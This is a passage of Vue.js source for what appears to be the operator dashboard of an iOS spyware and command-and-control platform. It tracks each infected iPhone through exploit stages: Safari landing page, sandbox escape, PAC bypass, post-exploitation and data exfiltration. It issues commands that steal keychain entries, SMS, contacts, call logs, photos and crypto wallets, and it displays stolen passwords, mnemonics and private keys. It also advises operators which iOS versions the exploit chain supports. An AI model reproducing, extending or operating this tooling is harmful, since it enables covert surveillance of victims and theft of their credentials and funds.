    `%c[DeviceDetail:HEARTBEAT]%c expand toggle: ${oldVal ? '收起→展开' : '展开→收起'} | showAll=${newVal} | total=${total} | display=${displayCount}/${HEARTBEAT_LIMIT} | uuid=${uuid}`,
    'color:#3b82f6;font-weight:bold;', ''
  )
  nextTick(() => {
    try {
      const timelineEl = document.querySelector('.page-card .el-timeline')
      if (timelineEl) {
        const h = timelineEl.offsetHeight
        const items = timelineEl.querySelectorAll(':scope > .el-timeline-item')
        console.log(`[DeviceDetail:HEARTBEAT] nextTick relayout: timeline offsetHeight=${h}px, items=${items.length}`)
      }
    } catch (_) {}
  })
})
// heartbeats 本身变化时也打一次日志，方便排查"新心跳来了没显示"
watch(heartbeats, (newArr, oldArr) => {
  const newLen = Array.isArray(newArr) ? newArr.length : 0
  const oldLen = Array.isArray(oldArr) ? oldArr.length : 0
  const newestCreatedAt = newLen > 0 ? (newArr[0].created_at || newArr[0].time || null) : null
  const oldestCreatedAt = newLen > 0 ? (newArr[newLen - 1].created_at || newArr[newLen - 1].time || null) : null
  console.log(
    `%c[DeviceDetail:HEARTBEAT]%c data changed: ${oldLen} → ${newLen} | newest=${newestCreatedAt} | oldest=${oldestCreatedAt} | showAll=${showAllHeartbeats.value}`,
    'color:#3b82f6;font-weight:bold;', ''
  )
}, { deep: false })
const activeTab = ref('sandbox')
const cmdText = ref('')
const sendingCmd = ref(false)
const sendingAll = ref(false)
const scriptDialogVisible = ref(false)
const scriptsLoading = ref(false)
const scriptsList = ref([])
const selectedScriptId = ref(null)
const scriptRunning = ref(false)

// 命令执行历史（设备详情内联列表）
const cmdList = ref([])
const cmdTotal = ref(0)
const cmdPage = ref(1)
const cmdPageSize = ref(20)
const cmdStatusFilter = ref('')
const cmdQFilter = ref('')
const cmdLoading = ref(false)

const logs = ref([])
const logsLoading = ref(false)
const logsClearing = ref(false)
const logsFilterType = ref('')
const logsKeyword = ref('')
const logsSummary = ref(null)

const validPhotos = computed(() =>
  Array.isArray(tabsData.value?.photos)
    ? tabsData.value.photos.filter(p => p && (typeof p.id !== 'undefined'))
    : []
)

// 命令历史统计
const pendingCnt = computed(() => (cmdList.value || []).filter(c => c.status === 'pending').length)
const completedCnt = computed(() => (cmdList.value || []).filter(c => c.status === 'completed').length)
const failedCnt = computed(() => (cmdList.value || []).filter(c => c.status === 'failed').length)

const filteredLogs = computed(() => {
  let arr = Array.isArray(logs.value) ? logs.value : []
  // 最新日志显示在最前面（按加载顺序反转；后端按升序返回则需反转）
  try { arr = arr.slice().reverse() } catch (_) {}
  if (logsFilterType.value) {
    arr = arr.filter(x => String(x.type || '').toLowerCase() === String(logsFilterType.value).toLowerCase())
  }
  const kw = String(logsKeyword.value || '').trim().toLowerCase()
  if (kw) {
    arr = arr.filter(x => {
      const hay = [
        x.title || '', x.detail || '', x.source || '', x.type || '',
        ...(x.tags || []), x.ip || '', x.status_code != null ? String(x.status_code) : ''
      ].join(' ').toLowerCase()
      return hay.includes(kw)
    })
  }
  return arr
})

const isDeviceOnline = computed(() => {
  const s = String(device.value?.status || '').toLowerCase()
  return s === 'online' || s === 'active'
})

const formatOS = computed(() => {
  if (!device.value) return '-'
  const ver = device.value.os_version
  if (!ver) return '-'
  const model = device.value.device_model || device.value.hw_model || ''
  const hasIosInModel = /ios|iphone|ipad|ipod/i.test(model)
  const prefix = hasIosInModel ? '' : (model ? 'iOS ' : 'iOS ')
  return prefix + ver
})

const formatModel = computed(() => {
  if (!device.value) return '-'
  const primary = device.value.device_model
  const hw = device.value.hw_model
  if (primary && hw && primary !== hw) return `${primary} (${hw})`
  return primary || hw || '-'
})

const jailbrokenTag = computed(() => {
  const raw = (device.value?.jailbroken ?? '').toString().toLowerCase().trim()
  if (raw === 'yes' || raw === 'true' || raw === '1' || raw === 'jailbroken' || raw === '越狱') {
    return { type: 'danger', text: '已越狱' }
  }
  if (raw === 'no' || raw === 'false' || raw === '0' || raw === 'not_jailbroken' || raw === '未越狱' || raw === 'clean') {
    return { type: 'success', text: '未越狱' }
  }
  return { type: 'info', text: '未知' }
})

const exploitTag = computed(() => {
  const raw = (device.value?.exploit_status ?? '').toString().toLowerCase().trim()
  switch (raw) {
    case 'success':
    case 'exploited':
    case 'complete':
    case 'ok':
      return { type: 'success', text: '已利用' }
    case 'pending':
    case 'in_progress':
    case 'running':
      return { type: 'warning', text: '待利用' }
    case 'failed':
    case 'error':
      return { type: 'danger', text: '利用失败' }
    case 'not_supported':
    case 'unsupported':
      return { type: 'info', text: '不支持' }
    default:
      if (!raw) return { type: 'info', text: '未检测' }
      return { type: 'warning', text: raw }
  }
})

// 利用进度计算：基于设备状态、心跳来源、命令执行统计、窃取数据等信号综合判断
const exploitProgress = computed(() => {
  if (!device.value) {
    return { percent: 0, currentStage: '未知', stages: [], statusType: 'info', statusText: '未检测' }
  }
  const d = device.value
  const hbSources = (heartbeats.value || []).map(h => String(h?.source || '').toLowerCase())
  const tabs = tabsData.value || {}
  const exploitStatus = String(d.exploit_status || '').toLowerCase().trim()
  const isExploited = ['success', 'exploited', 'complete', 'ok'].includes(exploitStatus)
  const cmdCount = logsSummary.value?.command || 0
  const hasCommand = cmdCount > 0 || !!d.last_command_time
  const hasAccess = !!(d.host || d.access_path || d.referer)
  const caps = agentCapabilities.value

  // ── A3. 真实 9 类沙箱外数据 tab（不含 sandbox / cookies / storage / wallets / location / system_info）
  //     cookies + storage 是 JS 沙箱内可得的，sandbox 是能力描述；wallets/location/system_info
  //     是 loadTabs 多余请求的 category，不在 UI 里展示所以也不参与进度判定。
  const REAL_OUTSIDE_TABS = ['keychain', 'wifi', 'contacts', 'sms', 'calls', 'photos', 'files', 'wallet', 'battery']
  const tabLens = {}
  Object.keys(tabs).forEach(k => {
    tabLens[k] = Array.isArray(tabs[k]) ? tabs[k].length : 0
  })
  const outsideCounts = REAL_OUTSIDE_TABS.map(k => tabLens[k] || 0)
  const outsideNonEmpty = outsideCounts.filter(n => n > 0).length
  const outsideTotal = outsideCounts.reduce((s, n) => s + n, 0)
  const hasSandbox = (tabLens.sandbox || 0) > 0

  // hasExfilData（数据窃取 100% 达成条件）：
  // 至少 2 类以上真实沙箱外 tab 有数据；如果只有 0/1 类，说明还没窃取完（只回传了 sandbox-only fallback）
  const hasExfilData = outsideNonEmpty >= 2
  // 用户有时想知道"只要有任何沙箱外数据就算部分窃取"（供 desc 文案用）
  const hasAnyOutside = outsideNonEmpty >= 1

  // ── A2. post_exploit 阶段：去掉 exfil:sandbox fallback 的影响
  //     post_exploit 真实运行的信号应该是：有 post_exploit 心跳 / 有 exploit_report 心跳 /
  //     有命令调度 hasCommand。sandbox 回传 (exfil:sandbox) 是 fallback，不算 post_exploit 完成。
  const hbHasPostExploit = hbSources.some(s =>
    s.includes('post_exploit') ||
    s.includes('exploit_report') ||
    (s.startsWith('exfil:') && s !== 'exfil:sandbox')
  )
  const hasPostExploit = hbHasPostExploit || hasCommand

  // ── A1. Stage3 沙箱逃逸判定（严格版）
  //     旧判定：isExploited || exploit_report hb → done
  //     新判定：必须有任一以下成立才算 done：
  //       a) Agent 上报 native_bridge=true（真内核桥就绪，golden signal）
  //       b) 已有任何真实沙箱外数据回来（outsideNonEmpty>=1）（间接证明 native_bridge 曾经工作）
  //       c) exploit_status=success 且 没出现任何 ERROR-no-bridge（只能算 weak done）
  //     否则：如果 exploit_status=success 但 native_bridge=false（sandbox-only），
  //          说明后端 exploit_status 标记太乐观，进度不能算到 55% done。
  let exploitDone = false
  let exploitDesc = '未执行'
  if (caps.native_bridge === true) {
    exploitDone = true
    exploitDesc = '✅ Native桥就绪（内核权限可用）'
  } else if (hasAnyOutside) {
    exploitDone = true
    exploitDesc = `✅ 已有 ${outsideNonEmpty} 类沙箱外数据回传（间接证明逃逸成功）`
  } else if (isExploited && caps.native_bridge !== false) {
    exploitDone = true
    exploitDesc = '后端标记已利用（能力未回传，存疑）'
  } else if (hbSources.some(s => s.includes('exploit_report')) && caps.native_bridge !== false) {
    exploitDone = true
    exploitDesc = 'Exploit报告已上传（能力未回传，存疑）'
  } else if (isExploited && caps.native_bridge === false) {
    // 典型 sandbox-only：后端标记 success，但 Agent 明确上报 native_bridge=false
    exploitDone = false
    exploitDesc = '⚠️ 仅 Sandbox-only（Native桥未就绪，无法读沙箱外数据）'
  } else if (caps.available && caps.sbx0_success === true && caps.sbx1_success === true) {
    exploitDone = false
    exploitDesc = '利用中（Stage1/2 OK，Native桥待建）'
  } else if (hasSandbox || hasPostExploit) {
    exploitDone = false
    exploitDesc = '利用中（Sandbox 数据已回传，Stage3 进行中）'
  }

  // ── 详细调试日志：每次 exploitProgress 被重算就打印（方便排查 100% 误判）
  console.groupCollapsed(
    `%c[DeviceDetail:PROGRESS]%c device=${(d.device_uuid || '?').slice(0, 12)} exploit_status=${exploitStatus || '空'} native_bridge=${caps.native_bridge === true ? 'YES' : (caps.native_bridge === false ? 'NO' : '?')} → outsideNonEmpty=${outsideNonEmpty}/${REAL_OUTSIDE_TABS.length} hasExfilData=${hasExfilData}`,
    'color:#f43f5e;font-weight:bold;',
    ''
  )
  console.log(
    '%c[所有 tabs 长度]%c',
    'color:#a855f7;font-weight:bold;',
    '',
    JSON.parse(JSON.stringify(tabLens))
  )
  const outsideDebug = {}
  REAL_OUTSIDE_TABS.forEach(k => { outsideDebug[k] = tabLens[k] || 0 })
  console.log(
    `%c[REAL_OUTSIDE_TABS 明细]%c outsideNonEmpty=${outsideNonEmpty}(需≥2才判定100%完成) outsideTotal=${outsideTotal} items`,
    'color:#0ea5e9;font-weight:bold;',
    '',
    outsideDebug
  )
  console.log(
    '%c[信号量明细]%c',
    'color:#f59e0b;font-weight:bold;',
    '',
    {
      hasSandbox, hasAccess, isExploited, hasCommand, hbHasPostExploit, hasPostExploit,
      hasAnyOutside, hasExfilData,
      agentCaps: {
        nb: caps.native_bridge, sbx0: caps.sbx0_success, sbx1: caps.sbx1_success,
        pe_skipped: caps.pe_skipped, source: caps.source, available: caps.available
      },
      hbSources: hbSources.length > 0 ? hbSources : '(empty)'
    }
  )
  console.log(`exploit(55%) stage → done=${exploitDone}  desc="${exploitDesc}"`)
  console.groupEnd()

  const stages = [
    {
      key: 'online',
      label: '设备上线',
      percent: 10,
      done: !!d.first_seen,
      desc: d.first_seen ? `首次上线 ${formatRelative(d.first_seen)}` : '未上线'
    },
    {
      key: 'access',
      label: '漏洞页面访问',
      percent: 20,
      done: hasAccess,
      desc: d.host ? `访问 ${d.host}` : (d.access_path ? `路径 ${d.access_path.slice(0, 30)}` : '未访问')
    },
    {
      key: 'payload',
      label: '载荷加载执行',
      percent: 35,
      done: hasSandbox || hbSources.some(s => s.includes('sandbox')),
      desc: hasSandbox ? `沙箱数据 ${tabLens.sandbox || 0} 条（Cookies:${tabLens.cookies || 0},Storage:${tabLens.storage || 0}）` : (hasPostExploit ? '载荷已执行' : '未加载')
    },
    {
      key: 'exploit',
      label: '沙箱逃逸 (Stage3)',
      percent: 55,
      done: exploitDone,
      desc: exploitDesc
    },
    {
      key: 'post_exploit',
      label: '后渗透运行',
      percent: 70,
      done: hasPostExploit,
      desc: hasPostExploit ? (hbHasPostExploit ? '后渗透脚本已运行' : '命令通道已建立') : '未运行'
    },
    {
      key: 'c2',
      label: '命令通道建立',
      percent: 85,
      done: hasCommand,
      desc: hasCommand ? `已调度 ${cmdCount} 条命令` : '未建立'
    },
    {
      key: 'exfil',
      label: '数据窃取回传',
      percent: 100,
      done: hasExfilData,
      desc: hasExfilData
        ? `已回传 ${outsideNonEmpty}/${REAL_OUTSIDE_TABS.length} 类 · ${outsideTotal} 条沙箱外数据`
        : (hasAnyOutside
          ? `部分窃取（${outsideNonEmpty}/${REAL_OUTSIDE_TABS.length} 类，需≥2类才算完成）`
          : (hasSandbox ? '仅沙箱内数据（Cookies/Storage），未窃取到沙箱外数据' : '未窃取'))
    },
  ]

  // 计算当前进度百分比与阶段
  let percent = 0
  let currentStage = '未知'
  let currentIndex = -1
  stages.forEach((s, i) => {
    if (s.done) {
      percent = s.percent
      currentStage = s.label
    } else if (currentIndex < 0) {
      currentIndex = i
    }
  })
  if (currentIndex < 0) currentIndex = stages.length

  // 状态类型与文字
  let statusType = 'info'
  let statusText = '未检测'
  if (percent >= 100) {
    statusType = 'success'
    statusText = '完全控制'
  } else if (percent >= 70) {
    // 70%+ 但 native_bridge=false：实际是 sandbox-only 模式，不算"已利用"
    if (caps.native_bridge === false || (caps.available && !caps.native_bridge)) {
      statusType = 'warning'
      statusText = 'Sandbox-only 模式'
    } else {
      statusType = 'success'
      statusText = '已利用'
    }
  } else if (percent >= 35) {
    statusType = 'warning'
    statusText = '利用中'
  } else if (percent >= 10) {
    statusType = 'info'
    statusText = '已上线'
  }
  // 额外微调：如果 Agent 明确上报 native_bridge=false（sandbox-only），把状态类型降级成 warning
  if (statusType === 'success' && caps.native_bridge === false && outsideNonEmpty === 0) {
    statusType = 'warning'
  }

  return { percent, currentStage, currentIndex, stages, statusType, statusText }
})

const compatibleTag = computed(() => {
  const raw = (device.value?.compatible_level ?? '').toString().toLowerCase().trim()
  switch (raw) {
    case 'compatible':
    case 'supported':
    case 'yes':
      return { type: 'success', text: '兼容' }
    case 'partial':
    case 'partially_compatible':
    case 'limited':
      return { type: 'warning', text: '部分兼容' }
    case 'incompatible':
    case 'unsupported':
    case 'no':
      return { type: 'danger', text: '不兼容' }
    case 'too_high':
      return { type: 'warning', text: '版本过高' }
    case 'too_low':
      return { type: 'danger', text: '版本过低' }
    default:
      if (!raw) return { type: 'info', text: '未知' }
      return { type: 'primary', text: raw }
  }
})

// ── 设备真实能力（从 sandbox 类别 exfil 数据里取 Agent 上报的 capabilities）
// sandbox data_json 是一个 dict，后端 _expand_exfil_items 会把它包装成 [dict]，
// 所以 tabsData.sandbox[0] 就等于整个 sandbox-browser-profile（包含 capabilities 字段）。
const agentCapabilities = computed(() => {
  const empty = {
    available: false,
    native_bridge: null,
    pe_skipped: null,
    sbx0_success: null,
    sbx1_success: null,
    ios_version: null,
    localStorage: null,
    sessionStorage: null,
    indexedDB: null,
    webkit: null,
    note: null,
    source: 'none'
  }
  const sandboxRows = Array.isArray(tabsData.value?.sandbox) ? tabsData.value.sandbox : []
  // 从新到旧找第一条包含 capabilities 的记录
  for (const row of sandboxRows) {
    if (!row || typeof row !== 'object') continue
    const caps = row.capabilities
    if (caps && typeof caps === 'object') {
      return {
        available: true,
        native_bridge: typeof caps.native_bridge === 'boolean' ? caps.native_bridge : null,
        pe_skipped: typeof caps.pe_skipped === 'boolean' ? caps.pe_skipped : null,
        sbx0_success: typeof caps.sbx0_success === 'boolean' ? caps.sbx0_success : null,
        sbx1_success: typeof caps.sbx1_success === 'boolean' ? caps.sbx1_success : null,
        ios_version: typeof caps.ios_version ? String(caps.ios_version) : null,
        localStorage: typeof caps.localStorage === 'boolean' ? caps.localStorage : null,
        sessionStorage: typeof caps.sessionStorage === 'boolean' ? caps.sessionStorage : null,
        indexedDB: typeof caps.indexedDB === 'boolean' ? caps.indexedDB : null,
        webkit: typeof caps.webkit === 'boolean' ? caps.webkit : null,
        note: typeof row.note === 'string' ? row.note : null,
        source: 'exfil_sandbox'
      }
    }
    // 有些数据可能是 _exfil_id/base 没有 capabilities，但 note 在外层也是有用
    if (typeof row.note === 'string' && row.note.includes('native_bridge')) {
      empty.note = row.note
    }
  }
  return empty
})

// ── Agent 能力概览：给 exploitProgress 判定时调用，给 UI 顶部展示都用它
const agentCapabilitySummary = computed(() => {
  const caps = agentCapabilities.value
  if (!caps.available) return {
    badgeType: 'info',
    badgeText: '能力未上报',
    summaryText: 'Agent 尚未回传 sandbox 能力数据（exploit 链未到 sandbox-only 或完整模式）',
    detail: []
  }
  const nb = caps.native_bridge
  const stg1 = caps.sbx0_success
  const stg2 = caps.sbx1_success
  let badgeType = 'info'
  let badgeText = '能力未知'
  if (nb === true) {
    badgeType = 'success'; badgeText = '内核桥就绪（完全模式）'
  } else if (nb === false) {
    badgeType = 'warning'; badgeText = 'Sandbox-only（无内核桥）'
  } else if (stg1 === true && stg2 === true) {
    badgeType = 'warning'; badgeText = 'Stage1/2 成功（Native桥待建）'
  } else {
    badgeType = 'info'; badgeText = '能力已上报'
  }
  const items = [
    { label: 'Native Bridge（内核权限）', value: caps.native_bridge, type: caps.native_bridge === true ? 'success' : (caps.native_bridge === false ? 'danger' : 'info') },
    { label: 'Stage1（SBX0 内存原语）', value: caps.sbx0_success, type: caps.sbx0_success === true ? 'success' : (caps.sbx0_success === false ? 'danger' : 'info') },
    { label: 'Stage2（SBX1 PAC 绕过）', value: caps.sbx1_success, type: caps.sbx1_success === true ? 'success' : (caps.sbx1_success === false ? 'danger' : 'info') },
    { label: 'PE 是否跳过', value: caps.pe_skipped, type: caps.pe_skipped === true ? 'warning' : (caps.pe_skipped === false ? 'success' : 'info') }
  ]
  return { badgeType, badgeText, summaryText: caps.note || '', detail: items }
})

const browserTagType = computed(() => {
  const name = String(device.value?.browser_name ?? '').toLowerCase()
  if (!name) return 'info'
  if (name === 'safari') return 'success'
  if (['chrome', 'edge', 'firefox', 'opera', 'brave', 'duckduckgo'].includes(name)) return 'primary'
  if (['微信', 'qq'].includes(name) || /wechat|micromessenger/i.test(name)) return 'warning'
  return 'info'
})

const _BLOCKED_LEVELS = new Set(['too_low', 'too_high', 'incompatible', 'unsupported', 'no'])
const commandsDisabled = computed(() => {
  const cl = (device.value?.compatible_level ?? '').toString().toLowerCase().trim()
  if (_BLOCKED_LEVELS.has(cl)) return true
  const es = (device.value?.exploit_status ?? '').toString().toLowerCase().trim()
  if (es && es !== 'success') return true
  return false
})
const commandAlertType = computed(() => {
  const cl = (device.value?.compatible_level ?? '').toString().toLowerCase().trim()
  if (cl === 'too_high') return 'warning'
  const es = (device.value?.exploit_status ?? '').toString().toLowerCase().trim()
  if (es === 'pending') return 'warning'
  return 'error'
})
const commandBlockReason = computed(() => {
  const cl = (device.value?.compatible_level ?? '').toString().toLowerCase().trim()
  const ver = device.value?.os_version || '未知'
  if (cl === 'too_low') {
    return `⚠️ 设备 iOS 版本（${ver}）过低，不支持命令下发。最低要求 iOS 13.0，建议使用 iOS 15.0 ~ 17.2 之间的 Safari 浏览器。`
  }
  if (cl === 'too_high') {
    return `⚠️ 设备 iOS 版本（${ver}）过高，当前漏洞利用链暂不支持，命令下发已禁止。最高支持 iOS 17.2。`
  }
  if (_BLOCKED_LEVELS.has(cl)) {
    return `⚠️ 设备不兼容（兼容级别：${cl}），命令下发已禁止。请使用 iOS 13.0 ~ 17.2 之间的 iPhone / iPad Safari 浏览器。`
  }
  const es = (device.value?.exploit_status ?? '').toString().toLowerCase().trim()
  if (es === 'pending') {
    return '⚠️ 设备尚未完成漏洞利用（当前：待利用），命令下发会一直 pending 不执行。请先用 iPhone Safari 打开渠道落地页触发 exploit，待「利用状态」变为「已利用」后再下发命令。'
  }
  if (es === 'failed') {
    return '❌ 设备漏洞利用失败（exploit_status=failed），命令下发不会执行。请更换 iOS 版本或检查 Stage1/2/3 exploit 文件是否正确配置。'
  }
  if (es && es !== 'success') {
    return `⚠️ 设备利用状态异常（${es}），命令下发不会执行。需等待 exploit_status 变为 success。`
  }
  return ''
})

const uptimeText = computed(() => {
  if (!device.value?.first_seen) return '-'
  const first = new Date(device.value.first_seen).getTime()
  const lastRaw = device.value.last_seen ? new Date(device.value.last_seen).getTime() : Date.now()
  if (Number.isNaN(first) || Number.isNaN(lastRaw)) return '-'
  const diffMs = Math.max(0, lastRaw - first)
  const s = Math.floor(diffMs / 1000)
  const d = Math.floor(s / 86400)
  const h = Math.floor((s % 86400) / 3600)
  const m = Math.floor((s % 3600) / 60)
  const parts = []
  if (d > 0) parts.push(`${d} 天`)
  if (h > 0) parts.push(`${h} 小时`)
  if (parts.length === 0) parts.push(`${m} 分钟`)
  return parts.join(' ')
})

// ─── 命令执行历史卡片的能力提示 ────────────────────────────────────
// 综合判断当前设备能否执行需要 native bridge 的命令：
//   1) compatible_level 不兼容 → 红色，全部失败
//   2) exploit_status pending/failed → 黄/红，命令不会执行
//   3) 即使 exploit_status=success，仍检查 cmdList 里是否有最近的 [ERROR-no-bridge]
//      失败记录（agent 实际处于 sandbox-only 模式），给出最精准的提示
//   4) 已利用且无 no-bridge 错误 → 绿色，全部可用
const capabilityHint = computed(() => {
  if (!device.value) return { show: false, type: 'info', title: '', desc: '' }
  const d = device.value
  const ver = d.os_version || '未知'
  const es = String(d.exploit_status || '').toLowerCase().trim()
  const cl = String(d.compatible_level || '').toLowerCase().trim()

  // 1. 不兼容（版本过高/过低/不支持）
  if (['too_low', 'too_high', 'incompatible', 'unsupported', 'no'].includes(cl)) {
    return {
      show: true,
      type: 'error',
      title: `设备不兼容（${cl}）— 命令无法执行`,
      desc: `iOS ${ver}：file.* / shell.* / wallet.* / keychain.* 等需要内核权限的命令都会失败。建议使用 iOS 13.0 ~ 17.2 的 iPhone / iPad Safari 浏览器。`
    }
  }

  // 2. 利用状态异常
  if (es === 'pending') {
    return {
      show: true,
      type: 'warning',
      title: '设备尚未完成漏洞利用（待利用）— 命令会一直 pending',
      desc: '请用 iPhone Safari 打开渠道落地页触发完整 exploit 链（Stage1→2→3），待「利用状态」变为「已利用」后再下发命令。'
    }
  }
  if (es === 'failed') {
    return {
      show: true,
      type: 'error',
      title: '设备漏洞利用失败 — 命令不会执行',
      desc: '请更换 iOS 版本或检查 Stage1/2/3 exploit 文件是否正确配置。'
    }
  }

  // 3. 关键：即使 exploit_status=success，仍检查最近命令是否有 [ERROR-no-bridge]
  //    这能精准捕获"后端认为已利用但 agent 实际 sandbox-only"的灰色场景
  const list = Array.isArray(cmdList.value) ? cmdList.value : []
  const noBridgeRow = list.find(c => {
    const out = String(c?.output || '') + String(c?.error || '')
    return out.includes('[ERROR-no-bridge]')
  })
  if (noBridgeRow) {
    const out = String(noBridgeRow.output || '') + String(noBridgeRow.error || '')
    const m = out.match(/原因：(.+?)(\n|$)/)
    const reason = m ? m[1].trim() : 'native bridge 未就绪'
    return {
      show: true,
      type: 'warning',
      title: '⚠️ Native bridge 未就绪 — 需要内核权限的命令会失败',
      desc: `最近一条命令返回 [ERROR-no-bridge]：${reason}。当前 agent 处于 sandbox-only 模式，file.read / file.list / file.recursive / shell.exec / keychain.dump / wallet.scan 等命令都会失败。建议：用支持的 iOS 版本重新触发完整 exploit 链，等 native bridge 自检（getpid）通过后再下发。`
    }
  }

  // 4. 已利用且最近无 no-bridge 错误
  if (['success', 'exploited', 'complete', 'ok'].includes(es)) {
    return {
      show: true,
      type: 'success',
      title: '✅ 设备已利用，native bridge 应已就绪 — 所有命令可执行',
      desc: `iOS ${ver}：file.* / shell.* / wallet.* / keychain.* 等命令均可用。如个别命令仍失败，请查看其输出排错。`
    }
  }

  // 5. 兜底：状态未知
  return {
    show: true,
    type: 'info',
    title: `设备能力状态未知（exploit_status=${es || '空'}）`,
    desc: '建议先下发一条测试命令（如 ds_system_info）确认 agent 是否就绪。'
  }
})

const cmdTemplates = [
  { label: '设备信息', cmd: 'ds_info' },
  { label: '获取位置', cmd: 'ds_location' },
  { label: '截屏', cmd: 'ds_screenshot' },
  { label: '窃取 Keychain', cmd: 'ds_exfil_keychain' },
  { label: '窃取通讯录', cmd: 'ds_exfil_contacts' },
  { label: '窃取短信', cmd: 'ds_exfil_sms' },
  { label: '窃取通话记录', cmd: 'ds_exfil_calls' },
  { label: '窃取 WiFi', cmd: 'ds_exfil_wifi' },
  { label: '窃取照片', cmd: 'ds_exfil_photos' },
  { label: '窃取钱包', cmd: 'ds_exfil_wallet' },
  { label: '🫨震动(iOS视觉)', cmd: 'ds_vibrate' },
  { label: '💬弹窗Alert', cmd: 'ds_alert Hello from Coruna!' }
]

const keychainCols = [
  { prop: 'service', label: '服务', width: 180 },
  { prop: 'account', label: '账号', width: 180 },
  { prop: 'password', label: '密码' },
  { prop: 'created_at', label: '同步时间', width: 160, type: 'date' }
]
const wifiCols = [
  { prop: 'ssid', label: 'SSID', width: 220 },
  { prop: 'password', label: '密码' },
  { prop: 'encryption', label: '加密方式', width: 120 }
]
const contactCols = [
  { prop: 'name', label: '姓名', width: 140 },
  { prop: 'phone', label: '电话' },
  { prop: 'email', label: '邮箱' }
]
const smsCols = [
  { prop: 'address', label: '对方号码', width: 160 },
  { prop: 'body', label: '内容' },
  { prop: 'type', label: '类型', width: 80 },
  { prop: 'date', label: '时间', width: 160, type: 'date' }
]
const callCols = [
  { prop: 'number', label: '号码', width: 160 },
  { prop: 'type', label: '类型', width: 100 },
  { prop: 'duration', label: '时长', width: 100 },
  { prop: 'date', label: '时间', width: 160, type: 'date' }
]
const fileCols = [
  { prop: 'name', label: '文件名' },
  { prop: 'path', label: '路径' },
  { prop: 'size', label: '大小', width: 100 },
  { prop: 'modified', label: '修改时间', width: 160, type: 'date' }
]
const walletCols = [
  { prop: 'type', label: '钱包类型', width: 140 },
  { prop: 'mnemonic', label: '助记词' },
  { prop: 'private_key', label: '私钥' }
]
const sandboxCols = [
  { prop: 'description', label: '项目', width: 160 },
  { prop: 'path', label: '数据路径' },
  { prop: 'file_size', label: '大小', width: 90 },
  { prop: 'uploaded_at', label: '采集时间', width: 170, type: 'date' },
  {
    prop: 'actions', label: '操作', width: 110, type: 'custom', _render: (scope) => {
      const row = scope?.row || {}
      const id = row.id
      if (!id) return null
      const token = localStorage.getItem('token') || ''
      const url = token
        ? `/api/exfil/${id}/download?token=${encodeURIComponent(token)}`
        : `/api/exfil/${id}/download`
      return h('a', {
        href: url,
        target: '_blank',
        class: 'el-link el-link--primary is-underline',
        style: 'cursor:pointer;'
      }, '下载')
    }
  }
]

// 通用 exfil 列定义（用于 cookies / storage / battery 等非沙箱数据）
const exfilGenericCols = [
  { prop: 'description', label: '项目', width: 160 },
  { prop: 'path', label: '数据路径' },
  { prop: 'file_size', label: '大小', width: 90 },
  { prop: 'uploaded_at', label: '采集时间', width: 170, type: 'date' },
  {
    prop: 'actions', label: '操作', width: 110, type: 'custom', _render: (scope) => {
      const row = scope?.row || {}
      const id = row.id
      if (!id) return null
      const token = localStorage.getItem('token') || ''
      const url = token
        ? `/api/exfil/${id}/download?token=${encodeURIComponent(token)}`
        : `/api/exfil/${id}/download`
      return h('a', {
        href: url,
        target: '_blank',
        class: 'el-link el-link--primary is-underline',
        style: 'cursor:pointer;'
      }, '下载')
    }
  }
]

const tabsData = ref({
  sandbox: [], keychain: [], wifi: [], contacts: [], sms: [], calls: [], photos: [], files: [], wallet: [],
  cookies: [], storage: [], battery: []
})

const dataTable = defineComponent({
  name: 'DataTable',
  props: { rows: { type: Array, default: () => [] }, cols: { type: Array, default: () => [] } },
  setup(props) {
    return () => {
      const rows = Array.isArray(props.rows) ? props.rows : []
      const cols = Array.isArray(props.cols) ? props.cols : []
      return h('div', {}, [
        h('el-table', {
          data: rows,
          stripe: true,
          size: 'small',
          style: { width: '100%' }
        },
          cols.map(col => {
            const colProps = { prop: col.prop, label: col.label }
            if (col.width != null) colProps.width = col.width
            if (col.type === 'date') {
              return h('el-table-column', colProps, {
                default: (scope) => {
                  const row = scope && scope.row ? scope.row : {}
                  const val = row[col.prop]
                  return h('span', { class: 'text-muted' }, val ? formatRelative(val) : '-')
                }
              })
            }
            if (typeof col._render === 'function') {
              return h('el-table-column', colProps, {
                default: (scope) => col._render(scope)
              })
            }
            return h('el-table-column', colProps)
          })
        ),
        rows.length === 0
          ? h('el-empty', { description: '暂无数据', style: { padding: '20px 0' } })
          : null
      ])
    }
  }
})

function goBack() {
  router.push('/devices')
}

async function loadDevice() {
  try {
    const res = await axios.get(`/api/devices/${uuid}`)
    device.value = res.data
  } catch (err) {
    const msg = err?.response?.data?.detail || err?.message || '设备信息加载失败'
    ElMessage.error(msg)
    device.value = { device_uuid: uuid, status: 'unknown' }
  }
}

async function loadHeartbeats() {
  try {
    const res = await axios.get(`/api/devices/${uuid}/heartbeats`)
    heartbeats.value = res.data?.items || res.data || []
  } catch (err) {
    const msg = err?.response?.data?.detail || err?.message || '心跳记录加载失败'
    ElMessage.error(msg)
    heartbeats.value = []
  }
}

async function loadTabs() {
  for (const tab of ['sandbox', 'keychain', 'wifi', 'contacts', 'sms', 'calls', 'files', 'wallet', 'photos', 'cookies', 'storage', 'battery']) {
    try {
      const res = await axios.get(`/api/exfil`, { params: { device_uuid: uuid, category: tab, limit: 20 } })
      tabsData.value[tab] = res.data?.items || res.data || []
    } catch (err) {
      const msg = err?.response?.data?.detail || err?.message || `${tab} 数据加载失败`
      ElMessage.error(msg)
      tabsData.value[tab] = []
    }
  }
}

function formatLogTime(t) {
  if (!t) return '-'
  try {
    const d = new Date(String(t).replace('Z', ''))
    if (Number.isNaN(d.getTime())) return String(t)
    const pad = (n) => String(n).padStart(2, '0')
    return `${d.getFullYear()}-${pad(d.getMonth() + 1)}-${pad(d.getDate())} ${pad(d.getHours())}:${pad(d.getMinutes())}:${pad(d.getSeconds())}`
  } catch (e) {
    return String(t)
  }
}

function termTag(t) {
  const map = {
    http: 'HTTP', command: 'CMD', exfil: 'EXFL', device: 'DEV',
    exploit: 'EXPL', exploit_console: 'EXPL', raw_log: 'IOS', log: 'LOG'
  }
  return map[t] || (t || 'LOG').toString().toUpperCase().slice(0, 4)
}

async function loadLogs() {
  logsLoading.value = true
  try {
    const res = await axios.get(`/api/devices/${uuid}/logs`, {
      params: { limit: 300, skip: 0, tail_log: 300 }
    })
    logs.value = res.data?.items || res.data || []
    logsSummary.value = res.data?.summary || null
  } catch (err) {
    const msg = err?.response?.data?.detail || err?.message || '日志加载失败'
    ElMessage.error(msg)
    logs.value = []
    logsSummary.value = null
  } finally {
    logsLoading.value = false
  }
}

async function copyLogs() {
